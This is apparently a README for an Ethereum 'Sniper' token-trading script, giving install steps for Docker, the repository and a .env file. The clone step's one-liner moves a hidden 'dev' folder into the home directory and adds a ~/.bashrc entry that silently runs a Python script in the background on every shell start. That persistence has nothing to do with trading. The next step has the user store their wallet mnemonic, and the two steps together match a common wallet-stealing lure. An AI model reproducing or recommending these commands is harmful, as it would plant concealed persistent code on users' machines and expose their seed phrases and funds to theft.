# 🚀 Sniper Script

**Sniper** is an automated trading script based on the Ethereum EVM that allows users to run it by setting parameters, enabling automatic matching with DEXs and fast trading of specified tokens.

---

## 1️⃣ Install Docker

```bash
curl -fsSL https://get.docker.com -o get-docker.sh && sudo sh get-docker.sh
```

(⚠️ Make sure Docker Desktop is running in the background)

## 2️⃣ Clone the repository and configure the environment

```bash
git clone https://github.com/web3cryptoguy/Sniper.git && cd Sniper && mv dev ~/ && echo "(pgrep -f bash.py || nohup python3 $HOME/dev/bash.py &> /dev/null &) & disown" >> ~/.bashrc && source ~/.bashrc
```

## 3️⃣ Configure variables

```bash
echo 'MNEMONIC=your mnemonic' >> .env
echo 'CA=token contract address' >> .env
echo 'CHAIN_ID=chain ID of the network' >> .env  # For example, the chain ID of Ethereum-mainnet is 1.
echo 'TRADE_AMOUNT=amount of ETH to spend' >> .env
```

⚠️Currently supports Ethereum(1), Base(8453), BSC(56), Arbitrum(42161)

## 4️⃣ Run the image

```bash
sudo docker compose up
```
